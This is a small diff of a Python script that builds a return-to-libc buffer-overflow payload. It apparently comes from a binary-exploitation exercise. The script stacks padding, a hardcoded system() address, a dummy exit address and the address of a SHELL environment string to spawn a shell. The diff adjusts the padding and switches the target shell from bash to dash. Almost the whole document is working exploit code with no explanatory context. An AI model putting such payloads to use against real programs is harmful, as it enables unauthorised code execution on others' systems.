@@ -9,15 +9,16 @@ def x(n):
 
 import subprocess
 
-payload = b'A' * (140 + 3*4)
+payload = b'A' * (140)
 system = 0xb7e6b060
 system = x(system)
 payload += system
 exit_addr = 0xDEADBEEF
 exit_addr = x(exit_addr)
 payload += exit_addr
-shell_addr = 0xBFFFF99C # SHELL=/bin/ba[sh]
+shell_addr = 0xBFFFF99C # SHELL=/bin/[da]sh
 shell_addr = x(shell_addr)
 payload += shell_addr
 
 print(payload)
+
